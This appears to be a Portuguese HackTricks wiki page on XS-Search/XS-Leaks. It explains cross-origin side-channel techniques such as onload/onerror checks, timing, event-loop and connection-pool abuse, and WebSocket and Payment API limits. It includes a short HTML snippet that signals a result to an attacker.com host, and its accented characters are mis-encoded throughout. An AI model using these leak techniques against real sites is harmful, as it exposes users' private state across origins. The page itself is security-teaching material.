# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e automatizar facilmente fluxos de trabalho com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? Ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informa√ß√µes B√°sicas**

XS-Search √© uma t√©cnica orientada para **exfiltrar informa√ß√µes de origem cruzada** abusando de **ataques de canal lateral**.

Existem diferentes elementos nesse tipo de ataque:

* **Web Vulner√°vel**: √â a web de onde queremos exfiltrar algumas informa√ß√µes
* **Web do Atacante**: √â a web que o atacante cria contendo o exploit e que a v√≠tima acessa
* **M√©todo de Inclus√£o**: √â o m√©todo usado para carregar a Web Vulner√°vel a partir da web do Atacante (como window.open, iframe, fetch, tag HTML com href...)
* **T√©cnica de Vazamento**: Ap√≥s acessar a web vulner√°vel, uma t√©cnica ser√° usada para diferenciar entre os poss√≠veis estados da web com as informa√ß√µes obtidas do m√©todo de inclus√£o usado.
* **Estados**: Os 2 poss√≠veis estados que a web vulner√°vel pode ter, dependendo da v√≠tima que queremos diferenciar.
* **Diferen√ßas Detect√°veis**: Essas s√£o as informa√ß√µes que o atacante tem que tentar decidir o status da web vulner√°vel.

### Diferen√ßas Detect√°veis

Para distinguir entre os 2 estados da p√°gina vulner√°vel, v√°rias coisas podem ser observadas:

* **C√≥digo de Status**. Um atacante pode distinguir **diferentes c√≥digos de status de resposta HTTP** de origem cruzada (por exemplo, erros do servidor, erros do cliente ou erros de autentica√ß√£o).
* **Uso de API**. Essa diferen√ßa detect√°vel permite que um atacante detecte o **uso de APIs da Web** em v√°rias p√°ginas, permitindo que um atacante infira se uma p√°gina de origem cruzada est√° usando uma API da Web JavaScript espec√≠fica.
* **Redirecionamentos**. √â poss√≠vel detectar se um aplicativo da web **redirecionou o usu√°rio para uma p√°gina diferente**. Isso n√£o se limita a redirecionamentos HTTP, mas tamb√©m inclui redirecionamentos acionados por JavaScript ou HTML.
* **Conte√∫do da P√°gina**. Essas **diferen√ßas detect√°veis aparecem no corpo da resposta HTTP** em si ou em sub-recursos inclu√≠dos pela p√°gina. Por exemplo, isso pode ser o **n√∫mero de frames inclu√≠dos** (cf. XS-Leak no Gitlab) ou diferen√ßas de tamanho de imagens.
* **Cabe√ßalho HTTP**. Um atacante pode detectar a presen√ßa de um **cabe√ßalho de resposta HTTP espec√≠fico** e pode ser capaz de obter seu valor. Isso inclui cabe√ßalhos como X-Frame-Options, Content-Disposition e Cross-Origin-Resource-Policy.
* **Tempo**: Um atacante pode detectar que existe uma diferen√ßa de tempo consistente entre 2 estados.

### M√©todos de Inclus√£o

* **Elementos HTML**. O HTML oferece uma variedade de elementos que permitem a **inclus√£o de recursos de origem cruzada**. Elementos como folhas de estilo, imagens ou scripts for√ßam o navegador da v√≠tima a solicitar um recurso n√£o-HTML especificado. Uma lista que enumera poss√≠veis elementos HTML para esse prop√≥sito est√° dispon√≠vel online ([https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks)).
* **Frames**. Elementos como **iframe**, **object** e **embed** podem incorporar recursos HTML adicionais diretamente na p√°gina do atacante. Se a p√°gina **n√£o usar prote√ß√£o de enquadramento**, o c√≥digo JavaScript pode acessar o objeto window do recurso emoldurado por meio da propriedade contentWindow.
* **Pop-ups**. O m√©todo **`window.open`** carrega um recurso em uma nova guia ou janela do navegador. O m√©todo retorna um **identificador de janela** que o c√≥digo JavaScript pode usar para acessar m√©todos e propriedades, que est√£o em conformidade com a SOP. Essas chamadas pop-up s√£o frequentemente usadas em logins √∫nicos. Navegadores modernos s√≥ permitem pop-ups se forem acionados por determinadas intera√ß√µes do usu√°rio. Para ataques XS-Leak, esse m√©todo √© especialmente √∫til porque **burla restri√ß√µes de enquadramento e cookies para um recurso de destino**. Vers√µes mais recentes do navegador recentemente adicionaram meios para isolar identificadores de janela.
* **Requisi√ß√µes JavaScript**. O JavaScript permite enviar solicita√ß√µes diretamente para recursos de destino. Existem duas maneiras diferentes para esse prop√≥sito: **XMLHttpRequests** e seu sucessor **Fetch** **API**. Ao contr√°rio dos m√©todos de inclus√£o anteriores, um atacante tem controle detalhado sobre a solicita√ß√£o emitida, por exemplo, se um redirecionamento HTTP deve ser seguido automaticamente.
### T√©cnicas de Vazamento

* **Manipulador de Eventos**. O manipulador de eventos pode ser visto como a t√©cnica cl√°ssica de vazamento para XS-Leaks. Eles s√£o uma fonte bem conhecida de v√°rias informa√ß√µes. Por exemplo, o acionamento do **onload** indica um carregamento de recurso **bem-sucedido** em contraste com o evento onerror.
* **Mensagens de Erro**. Al√©m dos manipuladores de eventos, as mensagens de erro podem ocorrer como **exce√ß√µes JavaScript** e **p√°ginas de erro especiais**. As mensagens de erro podem ser lan√ßadas em etapas diferentes, por exemplo, diretamente pela t√©cnica de vazamento. A t√©cnica de vazamento pode usar **informa√ß√µes adicionais** diretamente **contidas** na **mensagem de erro**, ou distinguir entre a **apar√™ncia e a aus√™ncia de uma mensagem de erro**.
* **Limites Globais**. Todo computador tem seus limites f√≠sicos, assim como um navegador. Por exemplo, a quantidade de mem√≥ria dispon√≠vel limita as guias em execu√ß√£o de um navegador. O mesmo vale para outros limites do navegador que s√£o aplicados a todo o navegador. Se um atacante puder determinar **quando o limite √© atingido, isso pode ser usado como uma t√©cnica de vazamento**.
* **Estado Global**. Os navegadores t√™m **estados globais com os quais todas as p√°ginas podem interagir**. Se essa intera√ß√£o for detect√°vel a partir do site de um atacante, ela pode ser usada como uma t√©cnica de vazamento. Por exemplo, a interface **History** permite a manipula√ß√£o das p√°ginas visitadas em uma guia ou quadro. Isso cria um estado global porque o **n√∫mero de entradas** permite que um atacante tire conclus√µes sobre p√°ginas de origem cruzada.
* **API de Desempenho**. A API de Desempenho √© usada para acessar as **informa√ß√µes de desempenho da p√°gina atual**. Suas entradas incluem dados detalhados de tempo de rede para o documento e todos os recursos carregados pela p√°gina. Isso permite que um atacante tire **conclus√µes sobre os recursos solicitados**. Por exemplo, identificamos casos em que os navegadores n√£o criar√£o entradas de desempenho para algumas solicita√ß√µes.
* **Atributos Leg√≠veis**. O HTML possui v√°rios **atributos que podem ser lidos entre origens**. Esse acesso de leitura pode ser usado como uma t√©cnica de vazamento. Por exemplo, o c√≥digo JavaScript pode ler o n√∫mero de quadros inclu√≠dos em uma p√°gina da web entre origens com a propriedade window.frame.length.

#### **T√©cnicas Baseadas em Tempo**

Algumas das seguintes t√©cnicas v√£o usar o tempo como parte do processo para detectar diferen√ßas nos poss√≠veis estados das p√°ginas da web. Existem diferentes maneiras de medir o tempo em um navegador da web.

**Rel√≥gios**: A API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) permite que os desenvolvedores obtenham medi√ß√µes de tempo de alta resolu√ß√£o.\
Existem um n√∫mero consider√°vel de APIs que os atacantes podem abusar para criar rel√≥gios impl√≠citos: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), anima√ß√µes CSS e outros.\
Para mais informa√ß√µes: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## XSinator

XSinator √© uma ferramenta autom√°tica para **verificar navegadores em rela√ß√£o a v√°rios XS-Leaks conhecidos**, explicados em seu artigo: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)\
Voc√™ pode acessar a ferramenta em [https://xsinator.com/](https://xsinator.com/)

{% hint style="warning" %}
**XS-Leaks Exclu√≠dos**: Tivemos que excluir XS-Leaks que dependem de **service workers**, pois eles interfeririam em outros vazamentos no XSinator. Al√©m disso, optamos por **excluir XS-Leaks que dependem de configura√ß√µes incorretas e bugs em um aplicativo da web espec√≠fico**. Por exemplo, configura√ß√µes incorretas de Cross-Origin Resource Sharing (CORS), vazamento de postMessage ou Cross-Site Scripting. Al√©m disso, exclu√≠mos XS-Leaks baseados em tempo, pois muitas vezes s√£o lentos, ruidosos e imprecisos.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
Use o [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para criar e **automatizar fluxos de trabalho** com facilidade, usando as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## T√©cnicas de Manipulador de Eventos

### Onload/Onerror

* **M√©todos de Inclus√£o**: Frames, Elementos HTML
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Resumo**: se ao tentar carregar um recurso os eventos onerror/onload s√£o acionados com o carregamento do recurso bem-sucedido/malsucedido, √© poss√≠vel descobrir o c√≥digo de status.
* **Exemplo de c√≥digo**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

O exemplo de c√≥digo tenta **carregar objetos de script a partir de JS**, mas **outros tags** como objetos, folhas de estilo, imagens, √°udios tamb√©m podem ser usados. Al√©m disso, tamb√©m √© poss√≠vel injetar a **tag diretamente** e declarar os eventos `onload` e `onerror` dentro da tag (em vez de injet√°-los a partir do JS).

Existe tamb√©m uma vers√£o sem script deste ataque:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Neste caso, se `example.com/404` n√£o for encontrado, `attacker.com/?error` ser√° carregado.

### Tempo de Carregamento

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Tempo (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Resumo**: A \*\*\*\* [**API performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) pode ser usada para medir quanto tempo leva para realizar uma solicita√ß√£o. No entanto, outros rel√≥gios podem ser usados, como [**API PerformanceLongTaskTiming**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming), que pode identificar tarefas em execu√ß√£o por mais de 50ms.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) outro exemplo em:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Tempo de Carregamento + Tarefa Pesada For√ßada

Essa t√©cnica √© semelhante √† anterior, mas o **atacante** tamb√©m ir√° **for√ßar** alguma a√ß√£o para levar um **tempo relevante** quando a **resposta for positiva ou negativa** e medir esse tempo.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### Tempo de Descarregamento/Beforeunload

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Tempo (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Resumo**: O [rel√≥gio SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) pode ser usado para medir quanto tempo leva para realizar uma solicita√ß√£o. Outros rel√≥gios podem ser usados.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Os eventos [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) e [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event) podem ser usados para medir o tempo que leva para buscar um recurso. Isso funciona porque o **`beforeunload`** √© acionado quando o navegador faz uma **nova solicita√ß√£o de navega√ß√£o**, enquanto o **`unload`** √© acionado quando essa **navega√ß√£o realmente ocorre**. Devido a esse comportamento, √© poss√≠vel calcular a diferen√ßa de tempo entre esses dois eventos e medir o **tempo que o navegador levou para concluir a busca do recurso**.

### Tempo de Frame com Sandbox + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Tempo (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Resumo**: A API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) pode ser usada para medir quanto tempo leva para realizar uma solicita√ß√£o. Outros rel√≥gios podem ser usados.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Se uma p√°gina n√£o tiver nenhuma [Prote√ß√£o de Enquadramento](https://xsleaks.dev/docs/defenses/opt-in/xfo/) implementada, um atacante pode medir quanto tempo leva para a p√°gina e todos os subrecursos serem carregados pela rede. Por padr√£o, o manipulador `onload` para um iframe √© invocado ap√≥s todos os recursos terem sido carregados e todo o JavaScript ter terminado de executar. No entanto, um atacante pode eliminar o ru√≠do da execu√ß√£o do script incluindo o atributo [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) no `<iframe>`. Esse atributo bloqueia muitos recursos, incluindo a execu√ß√£o de JavaScript, o que resulta em uma medi√ß√£o quase pura da rede.

### #ID + error + onload

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**:
* **Resumo**: Se voc√™ puder fazer com que a p√°gina apresente erro quando o conte√∫do correto for acessado e faz√™-la carregar corretamente quando qualquer conte√∫do for acessado, ent√£o voc√™ pode criar um loop para extrair todas as informa√ß√µes sem medir o tempo.
* **Exemplo de C√≥digo**:

Suponha que voc√™ possa **inserir** a **p√°gina** que cont√©m o **conte√∫do secreto** dentro de um iframe.

Voc√™ pode fazer com que a v√≠tima procure pelo arquivo que cont√©m "_**flag**_" usando um **iframe** (explorando um CSRF, por exemplo). Dentro do iframe, voc√™ sabe que o evento _**onload**_ ser√° **executado pelo menos uma vez**. Ent√£o, voc√™ pode **alterar** a **URL** do **iframe**, mas alterando apenas o **conte√∫do** do **hash** dentro da URL.

Por exemplo:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Se a primeira URL foi **carregada com sucesso**, ent√£o, ao **alterar** a parte do **hash** da URL, o evento **onload** **n√£o ser√° acionado novamente**. Mas **se** a p√°gina tiver algum tipo de **erro** ao **carregar**, ent√£o o evento **onload** ser√° **acionado novamente**.

Dessa forma, voc√™ pode **distinguir** entre uma p√°gina **carregada corretamente** ou uma p√°gina que apresenta um **erro** ao ser acessada.

### Execu√ß√£o de Javascript

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**:
* **Resumo**: Se a **p√°gina** estiver **retornando** o **conte√∫do sens√≠vel**, ou um **conte√∫do** que pode ser **controlado** pelo usu√°rio. O usu√°rio pode definir um **c√≥digo JS v√°lido no caso negativo**, e **carregar** cada tentativa dentro de tags **`<script>`**, para que nos casos **negativos** o c√≥digo do atacante seja **executado**, e nos casos **afirmativos** **nada** ser√° executado.
* **Exemplo de C√≥digo**:

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}
### CORB - Onerror

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: C√≥digo de Status e Cabe√ßalhos
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Resumo**: Os atacantes podem observar quando o CORB √© aplicado se uma resposta retornar um `Content-Type` protegido por CORB (e `nosniff`) com o c√≥digo de status `2xx`, o que resulta na remo√ß√£o do corpo e dos cabe√ßalhos da resposta pelo CORB. Detectar essa prote√ß√£o permite que um atacante **revele** a combina√ß√£o do **c√≥digo de status** (sucesso vs. erro) e o **`Content-Type` (protegido por CORB ou n√£o).**
* **Exemplo de c√≥digo**:

Verifique o link de mais informa√ß√µes para obter mais detalhes sobre o ataque.

### onblur

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Resumo**: Vazamento de dados sens√≠veis do atributo id ou name.
* **Exemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

√â poss√≠vel **carregar uma p√°gina** dentro de um **iframe** e usar o **`#id_value`** para fazer a p√°gina **focar no elemento** do iframe indicado, ent√£o, se um sinal **`onblur`** for acionado, o elemento ID existe.\
Voc√™ pode realizar o mesmo ataque com tags **`portal`**.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Uso da API
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Resumo**: Obter informa√ß√µes sens√≠veis de um postMessage ou usar a presen√ßa de postMessages como um or√°culo para saber o status do usu√°rio na p√°gina.
* **Exemplo de c√≥digo**: `Qualquer c√≥digo ouvindo todos os postMessages.`

Aplica√ß√µes frequentemente usam [postMessage broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) para compartilhar informa√ß√µes com outras origens. Ouvindo essas mensagens, √© poss√≠vel encontrar **informa√ß√µes sens√≠veis** (potencialmente se o par√¢metro `targetOrigin` n√£o for usado). Al√©m disso, o fato de receber alguma mensagem pode ser **usado como um or√°culo** (voc√™ s√≥ recebe esse tipo de mensagem se estiver logado).

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
Use o [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para criar e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## T√©cnicas de Limites Globais

### WebSocket API

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Uso da API
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Resumo**: Esgotar o limite de conex√µes WebSocket revela o n√∫mero de conex√µes WebSocket de uma p√°gina de origem cruzada.
* **Exemplo de c√≥digo**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

√â poss√≠vel identificar se, e quantas, **conex√µes WebSocket uma p√°gina de destino usa**. Isso permite que um atacante detecte estados de aplica√ß√£o e vaze informa√ß√µes relacionadas ao n√∫mero de conex√µes WebSocket.

Se uma **origem** usa a **quantidade m√°xima de objetos de conex√£o WebSocket**, independentemente do estado das conex√µes, a cria√ß√£o de **novos objetos resultar√° em exce√ß√µes JavaScript**. Para executar esse ataque, o site do atacante abre o site de destino em um pop-up ou iframe e, em seguida, ap√≥s o carregamento do site de destino, tenta criar o n√∫mero m√°ximo de conex√µes WebSocket poss√≠vel. O **n√∫mero de exce√ß√µes lan√ßadas** √© o **n√∫mero de conex√µes WebSocket usadas pelo site de destino**.

### Payment API

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Uso da API
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Resumo**: Detectar solicita√ß√µes de pagamento porque apenas uma pode estar ativa por vez.
* **Exemplo de c√≥digo**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Essa XS-Leak permite que um atacante **detecte quando uma p√°gina de origem cruzada inicia uma solicita√ß√£o de pagamento**.

Porque **apenas uma solicita√ß√£o de pagamento pode estar ativa** ao mesmo tempo, se o site de destino estiver usando a API de Solicita√ß√£o de Pagamento, qualquer **tentativa posterior de usar essa API falhar√°** e causar√° uma **exce√ß√£o JavaScript**. O atacante pode explorar isso **tentando periodicamente mostrar a interface da API de Pagamento**. Se uma tentativa causar uma exce√ß√£o, o site de destino est√° atualmente usando a API. O atacante pode ocultar essas tentativas peri√≥dicas fechando imediatamente a interface ap√≥s a cria√ß√£o.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **M√©todos de Inclus√£o**:
* **Diferen√ßa Detect√°vel**: Tempo (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Resumo**: Medir o tempo de execu√ß√£o de um site abusando do loop de eventos JS de thread √∫nico.
* **Exemplo de c√≥digo**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

O modelo de concorr√™ncia do JavaScript √© baseado em um [loop de eventos de thread √∫nico](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop), o que significa que **ele s√≥ pode executar uma tarefa de cada vez**.\
Inferir **quanto tempo o c√≥digo de uma origem diferente leva para ser executado** medindo quanto tempo leva para ser executado no pr√≥ximo evento do pool de eventos. O atacante continua enviando eventos para o loop de eventos com propriedades fixas, que eventualmente ser√£o despachados se o pool estiver vazio. Outras origens despacham eventos para o mesmo pool, e √© a√≠ que um **atacante infere a diferen√ßa de tempo detectando se ocorreu um atraso com uma de suas tarefas**.

{% hint style="warning" %}
Em uma medi√ß√£o de tempo de execu√ß√£o, √© poss√≠vel **eliminar** **fatores de rede** para obter **medi√ß√µes mais precisas**. Por exemplo, carregando os recursos usados pela p√°gina antes de carreg√°-la.
{% endhint %}
### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

* **M√©todos de Inclus√£o**:
* **Diferen√ßa Detect√°vel**: Tempo (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Resumo:** Medir o tempo de execu√ß√£o de um web bloqueando o loop de eventos de uma thread e cronometrando **quanto tempo leva para o loop de eventos ficar dispon√≠vel novamente**.
* **Exemplo de C√≥digo**:

Uma das principais vantagens dessa t√©cnica √© sua capacidade de contornar o Isolamento do Site, pois uma origem de ataque pode influenciar a execu√ß√£o de outra origem.

{% hint style="warning" %}
Em uma cronometragem de execu√ß√£o, √© poss√≠vel **eliminar** **fatores de rede** para obter **medi√ß√µes mais precisas**. Por exemplo, carregando os recursos usados pela p√°gina antes de carreg√°-la.
{% endhint %}

### Pool de Conex√µes

* **M√©todos de Inclus√£o**: Requisi√ß√µes JavaScript
* **Diferen√ßa Detect√°vel**: Tempo (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Resumo:** Um atacante pode bloquear todos os sockets, exceto 1, carregar a p√°gina alvo e ao mesmo tempo carregar outra p√°gina, o tempo at√© que a √∫ltima p√°gina comece a carregar √© o tempo que a p√°gina alvo levou para carregar.
* **Exemplo de C√≥digo**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Os navegadores usam sockets para se comunicar com servidores. Como o sistema operacional e o hardware em que ele √© executado t√™m recursos limitados, **os navegadores precisam impor um limite**. Para explorar a exist√™ncia desse limite, os atacantes podem:

1. Verificar qual √© o limite do navegador, por exemplo, 256 sockets globais.
2. Bloquear 255 sockets por um longo per√≠odo de tempo, realizando 255 solicita√ß√µes a hosts diferentes que simplesmente penduram a conex√£o.
3. Usar o 256¬∫ socket realizando uma solicita√ß√£o √† p√°gina alvo.
4. Realizar uma 257¬™ solicita√ß√£o a outro host. Como todos os sockets est√£o sendo usados (nos passos 2 e 3), essa solicita√ß√£o deve esperar at√© que o pool receba um socket dispon√≠vel. Esse per√≠odo de espera fornece ao atacante o tempo de cronometragem de rede do 256¬∫ socket, que pertence √† p√°gina alvo. Isso funciona porque os 255 sockets no passo 2 ainda est√£o bloqueados, ent√£o, se o pool recebeu um socket dispon√≠vel, foi causado pela libera√ß√£o do socket no passo 3. O tempo para liberar o 256¬∫ socket est√° diretamente relacionado ao tempo necess√°rio para concluir a solicita√ß√£o.

Para mais informa√ß√µes: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Pool de Conex√µes por Destino

* **M√©todos de Inclus√£o**: Requisi√ß√µes JavaScript
* **Diferen√ßa Detect√°vel**: Tempo (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**:
* **Resumo:** √â como a t√©cnica anterior, mas em vez de usar todos os sockets, o Google **Chrome** imp√µe um limite de **6 solicita√ß√µes simult√¢neas para a mesma origem**. Se **bloquearmos 5** e depois **lan√ßarmos uma 6¬™** solicita√ß√£o, podemos **cronometr√°-la** e se conseguirmos fazer com que a **p√°gina da v√≠tima envie** mais **solicita√ß√µes** para o mesmo endpoint para detectar um **status** da **p√°gina**, a **6¬™ solicita√ß√£o** levar√° **mais tempo** e poderemos detect√°-la.

##

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para criar e **automatizar fluxos de trabalho** com facilidade, usando as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje mesmo:

